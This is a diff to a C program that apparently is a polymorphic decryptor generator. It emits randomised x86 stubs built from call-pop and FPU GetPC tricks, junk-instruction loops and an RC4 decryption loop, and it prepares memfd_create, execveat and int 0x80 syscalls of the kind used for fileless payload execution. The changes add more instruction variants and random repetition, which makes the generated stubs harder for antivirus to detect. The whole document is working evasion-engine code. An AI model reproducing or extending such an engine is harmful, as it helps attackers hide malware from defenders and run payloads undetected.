@@ -9,6 +9,7 @@
 #include <string.h>
 #include <time.h>
 #include <stdbool.h>
+#include <stdarg.h>
 
 #define __NR_execveat	  358
 #define __NR_memfd_create 356
@@ -73,6 +74,8 @@
 #define OP_CJMP_NEAR_IMM 	0x74
 #define OP_JMP_NEAR_IMM 	0xe9
 #define OP_CALL_NEAR_IMM 	0xe8
+#define OP_INT_x80			0x80cd 
+#define OP_RET				0xc3
 #define OP_BUILD2(op, dest, src) OP_SRC(op, src) | OP_DST(op, dest)
 #define OP_SRC(x, y)		x | y << 11	
 #define OP_DST(x, y)		x | y << 8	
@@ -240,7 +243,6 @@ void pushad_1 (uint8_t *decryptor_buff, uint32_t *offset) {
 		*offset += sizeof(uint8_t);
 	}	
 }
-
 
 void popad_0 (uint8_t *decryptor_buff, uint32_t *offset) {
 	*(uint8_t*)(decryptor_buff + *offset) = OP_POPAD;
@@ -636,13 +638,15 @@ void call_near_0 (uint8_t *decryptor_buff, uint32_t *offset, uint32_t dest){
 }
 
 void delta_1 (uint8_t *decryptor_buff, uint32_t *offset, uint32_t reg, uint32_t *delta) {
-	uint16_t finst[] = {OP_FLDZ};
+	uint16_t finst[] = {OP_FLDZ, OP_FLDPI, OP_FLDN2, OP_FLDLG2};
 	int idx = genrand(sizeof(finst)/sizeof(uint16_t));
 
-	*delta = *offset;
-	*(uint16_t*)(decryptor_buff + *offset) = finst[idx];
-	*offset += sizeof(uint16_t);
-	
+	for (int i=0; i < genrand(20) + 5; i++) {
+		*delta = *offset;
+		*(uint16_t*)(decryptor_buff + *offset) = finst[idx];
+		*offset += sizeof(uint16_t);
+	}
+
 	INVOKE_RANDFUNC(push_variants_arr, decryptor_buff, offset, idx);
 	INVOKE_RANDFUNC(sub_reg_imm_variants_arr, decryptor_buff, offset, REG_ESP, 32);
 	
@@ -663,7 +667,6 @@ void delta_1 (uint8_t *decryptor_buff, uint32_t *offset, uint32_t reg, uint32_t 
 
 void delta_0 (uint8_t *decryptor_buff, uint32_t *offset, uint32_t reg, uint32_t *delta) {
 	call_near_0(decryptor_buff, offset, *offset+sizeof(uint32_t));
-	
 	*delta = *offset;
 	INVOKE_RANDFUNC(pop_variants_arr, decryptor_buff, offset, reg);	
 }
@@ -674,6 +677,29 @@ void sbtg_write (uint8_t *decryptor_buff, uint32_t *offset, size_t size, uint8_t
 		*offset += sizeof(uint8_t);
 	}
 }
+
+void sbtg_memfd_creat(uint8_t *decryptor_buff, uint32_t *offset) {
+}
+
+/*
+void sbtg_memfd_cre(uint8_t *decryptor_buff, uint32_t *offset, uint32_t sysn, uint32_t nargs, ...) {
+	va_list vl;
+  	va_start(vl, nargs);
+	uint32_t val;
+
+	uint32_t params[] = {REG_EBX, REG_ECX, REG_EDX, REG_ESI, REG_EDI, REG_EBP};
+	
+	mov_reg_imm_0 (decryptor_buff, offset, REG_EAX, sysn);
+
+	for (int i = 0; i < nargs; i++) {
+		val = va_arg(vl, uint32_t);
+		mov_reg_imm_0 (decryptor_buff, offset, params[i], val);
+	}
+	va_end(vl);
+
+	*(uint16_t*)(decryptor_buff + *offset) = OP_INT_x80;
+	*offset += sizeof(uint16_t);
+}*/
 
 int sbtg_get_random_str(uint8_t *buff, size_t size) {
 	int fd;
@@ -988,8 +1014,8 @@ void Sbtg_RC4 (uint8_t *decryptor_buff, size_t decryptor_buff_size, uint32_t *co
 	INVOKE_RANDFUNC(cmp_reg_0_variants_arr, decryptor_buff, code_offset, vregs[2], 0);
 	
 	cjmp_near_imm_0(decryptor_buff, code_offset, loop_start1, CJMP_NZ_);
-
 }
+
 
 void Sbtg(uint8_t *decryptor_buff, size_t decryptor_buff_size, uint32_t flags) {
 	uint32_t code_offset = 0;
@@ -1013,8 +1039,10 @@ void Sbtg(uint8_t *decryptor_buff, size_t decryptor_buff_size, uint32_t flags) {
 	if (flags & CONF_PRESERVE_REGISTERS) {
 		INVOKE_RANDFUNC(popad_variants_arr, decryptor_buff, &code_offset);
 	}
+
 	INVOKE_RANDFUNC(epilogue_variants_arr, decryptor_buff, &code_offset);
-	*(uint8_t*)(decryptor_buff + code_offset) = 0xc3;
+	*(uint8_t*)(decryptor_buff + code_offset) = OP_RET;
+	code_offset += sizeof(uint8_t);
 }
 
 bool alloc_file(int *fd, struct stat *st, const char *filename, uint8_t **buf) { 
